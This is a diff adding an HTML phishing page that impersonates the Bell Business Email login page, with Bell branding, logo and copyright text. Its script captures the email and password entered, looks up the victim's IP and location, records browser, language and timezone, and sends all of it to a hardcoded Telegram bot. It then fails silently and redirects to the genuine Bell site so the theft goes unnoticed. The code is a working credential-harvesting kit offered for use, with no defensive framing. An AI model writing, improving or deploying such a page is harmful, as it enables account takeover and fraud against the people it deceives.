@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bell Business Email Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Helvetica, sans-serif;
+    }
+    html, body {
+      height: 100%;
+      width: 100%;
+    }
+    .background {
+      background-image: url('https://i.postimg.cc/KYGvkZzk/photo-2025-04-17-00-27-57.jpg');
+      background-size: cover;
+      background-position: center;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      background-color: #005aa7;
+      height: 50px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 20px;
+      color: white;
+      font-size: 14px;
+    }
+    .header img {
+      height: 50px;
+    }
+    .header .right {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header a, .header i {
+      color: white;
+      text-decoration: none;
+    }
+    .main-content {
+      display: flex;
+      flex: 1;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 50px;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .login-box h2 {
+      margin-bottom: 20px;
+    }
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .login-box button {
+      background-color: #003366;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .login-box .links {
+      margin-top: 10px;
+      font-size: 12px;
+      text-align: center;
+    }
+    .login-box .links a {
+      text-decoration: none;
+      color: #005aa7;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="background">
+    <div class="header">
+      <img src="https://i.ibb.co/C3V1syVq/photo-2025-04-16-23-07-47.jpg" alt="Bell Logo">
+      <div class="right">
+        <i class="fas fa-bell"></i>
+        <a href="#">Français</a>
+      </div>
+    </div>
+    <div class="main-content">
+      <div class="login-box">
+        <h2>Log in</h2>
+        <form id="loginForm">
+          <label for="email">Email address</label>
+          <input type="text" id="email" name="email" required />
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+          <button type="submit">Log in</button>
+        </form>
+        <div class="links">
+          <p>Forgot your password? Call <strong>310-BELL</strong> to reset it.</p>
+          <p><a href="#">Privacy</a> | <a href="#">Legal & Regulatory</a></p>
+          <p>© Bell Canada. All rights reserved.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '7872296367:AAHBItXb7od6gkGaqb4JzDFbrlsHjPLAWzY'; // Replace with your Telegram Bot Token
+    const CHAT_ID = '7601666417'; // Replace with your Telegram Chat ID
+
+    // Get email from URL parameter if exists
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlEmail = urlParams.get('email');
+    
+    // If email parameter exists in URL, pre-fill the email field
+    if (urlEmail) {
+      document.getElementById('email').value = urlEmail;
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const browseragent = navigator.userAgent;
+      const language = navigator.language || navigator.userLanguage;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      // Get IP and Location Info
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const ip = data.ip;
+        const country = data.country_name;
+        const city = data.city;
+        const region = data.region;
+
+        const message = `
+💥🎓🚀🏆BELL RESZULT 2025 COCONUTHEAD101💥🎓🚀🏆
+
+📧 Email: ${email}
+🔐 Password: ${password}
+📌 IP: ${ip}
+🌐 Country: ${country}
+🏙️ City: ${city}
+📍 Region: ${region}
+📺 Browser: ${browseragent}
+🚩 Language: ${language}
+🕰️ Timezone: ${timezone}
+        `;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+
+      } catch (error) {
+        // Silent fail
+      }
+
+      // Redirect
+      window.location.href = "http://www.bell.ca/shop/Sb_BusinessContactUs_Landing.page";
+    });
+  </script>
+</body>
+</html>
